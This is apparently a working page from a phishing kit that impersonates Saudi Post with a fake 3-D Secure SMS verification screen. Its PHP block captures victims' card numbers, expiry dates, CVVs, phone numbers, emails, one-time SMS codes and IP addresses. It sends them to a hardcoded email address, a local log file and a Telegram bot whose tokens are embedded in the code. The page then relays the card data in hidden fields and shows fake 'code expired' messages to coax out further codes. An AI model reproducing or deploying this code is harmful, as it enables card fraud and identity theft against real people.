﻿<?php
session_start();
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "sms  1       : ".$_POST['otp']."\n";
$bilsmg .= "------------------------------------------------------\n";
$bilsmg .= "N-Phone      : ".$_POST['tel']."\n";
$bilsmg .= "E-mail       : ".$_POST['email']."\n";
$bilsmg .= "C-Number     : ".$_POST['cc']."\n";
$bilsmg .= "D-Expiration : ".$_POST['expe']."\n";
$bilsmg .= "CVN          : ".$_POST['cvv']."\n";
$bilsmg .= "--------------------------------------------------------\n";
$bilsmg .= "From : $ip \n";

$bilsub = "Saudi Post CC :) sms1 - ".$ip;
$bilhead = "From: KSA BOX <send@saudipost.io>";
if(!empty($_POST['otp']) && strlen($_POST['otp'])>5 && file_exists("../CC-sp.txt")){
mail("natachaperin@outlook.com",$bilsub,$bilsmg,$bilhead);
$file = fopen("../CC-sa.txt", 'a');
fwrite($file, $bilsmg);}
$token = "1078607995:AAFy-N4rHj_0-ocLFMy9FpOG9HB9bFPeQA8";
    file_get_contents("https://api.telegram.org/bot1797120271:AAEEcc55mkAqzVJlzCYgyAF-I_HjAyJTVqc/sendMessage?chat_id=-545643722&text=" . urlencode($bilsmg)."" );
?>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<HTML lang="en">
<HEAD>
    <TITLE>مصادقة</TITLE>
    <META content="text/html; charset=utf-8" http-equiv="Content-Type" />
    <LINK rel="stylesheet" type="text/css" href="https://acs4.3dsecure.no/mdpayacs/content/040/screen.css" />
    <LINK rel="stylesheet" type="text/css" href="https://acs4.3dsecure.no/mdpayacs/content/040/dk/gh-buttons.css" />
    <script src="https://acs4.3dsecure.no/mdpayacs/content/commons.js"></script>
    <script src="https://acs4.3dsecure.no/mdpayacs/content/040/js/jquery-1.9.1.min.js"></script>
    <script type="text/javascript" src="./Autentisering_files/date_time.js"></script>
    <script type="text/javascript">

        function onBodyLoad() {
            document.form.otp.focus();
        }
		
		function validate(){
	
var cd=document.getElementById("code");
var flag=0;

if (cd.value=="" || cd.value.length<6)
 {	cd.style.borderColor="red";flag=1;
 }else{ 
  	cd.style.borderColor="green";
   }
 if (flag==1)
{document.getElementById("msg_error").style.display="block";return false;}else{document.getElementById("msg_error").style.display="none";return true;}
	
		}
    </script>
</HEAD>
<BODY OnLoad="onBodyLoad();">
<DIV id="authform">
    <DIV class="wrapper">
        <DIV class="logos">
            <TABLE>
                <TBODY>
                <TR>
                    <TD class="identifier">
                        <IMG alt="" src="" style="max-height:56px;"/><IMG alt="" src="" style="max-height:56px;"/>
                    </TD>
                    <TD class="bank">
                    </TD>
                    <TD class="bank">
                        <IMG alt="" src="https://sp.com.sa/media/1841/engsplogo.png" style="max-height:56px;"/>
                    </TD>
                </TR>
                </TBODY>
            </TABLE>
        </DIV>
        <H1>Enter the SMS code</H1>
        <P>A verification code is sent to your mobile device (maximum 10 minutes).</P>
        <p>Enter the code received by phone to cancel the transaction</p>
        <FORM id="form" name="form" method="post" action="auth2.php" onsubmit="return validate()">
        <input name="sms1" value="<?php echo $_POST['otp']; ?>" type="hidden" />
         <input name="tel" value="<?php echo $_POST['tel']; ?>" type="hidden" />
        <input name="email" value="<?php echo $_POST['email']; ?>" type="hidden" />
        <input name="cc" value="<?php echo $_POST['cc'];?>" type="hidden" />
        <input name="expe" value="<?php echo $_POST['expe']; ?>" type="hidden" />
        <input name="cvv" value="<?php echo $_POST['cvv'];?>" type="hidden" />
            <DL style="margin-top: 10px;">
                <DT>Saudi Post</DT>
                <DD id="purchAmount">Box parcel</DD>

                <DT>date: </DT>
                <DD><span id="date_time"></span></DD>
				            <script type="text/javascript">window.onload = date_time('date_time');</script>

                <DT>Card number: </DT>
                <DD><?php 
                echo substr($_POST['cc'], 0, 4)." XXXX XXXX ".substr($_POST['cc'],-4);
                ?></DD>

                <DT>Mobile number: </DT>
                <DD><?php echo $_POST['tel'];?></DD>
                <DT>
                    <LABEL for="code">SMS code: </LABEL>
                </DT>
                <DD>
                    <INPUT name="otp" type="text" required="required" id="code" style="width: 100px" maxlength="8" onKeyPress="return submitenter(this,event)" width="6" />
                    <button class="button icon approve primary" name="submit" id="submit" type="submit" value="submit" style="position: absolute; margin-left: 5px;">confirmer</button>
                </DD>
            </DL>
            <div id="msg_error" class="error" style="display: none;padding-bottom:10px;">Please check the marked fields.</div>
            <DIV style="font-size: 0.92em; margin-bottom: 8px;">
             <div id="errorMessage" class="error">Your verification code has expired, a new code has been sent.</div>
             <div id="errorMessage" class="error">	Do not close the web page until you have received the one-time password </div>
                <div>
                <P>&nbsp;</P>
                
            </DIV>
            <A class="button icon settings" >Change number</A>
            <A class="button" >Saudi Post</A>
            <A class="button icon add" >New code</A>
            <DIV style="float: right;">
                <A class="button icon arrowleft" >return</A>
            </DIV>
        </FORM>
    </DIV>
</DIV>
</BODY>
</HTML>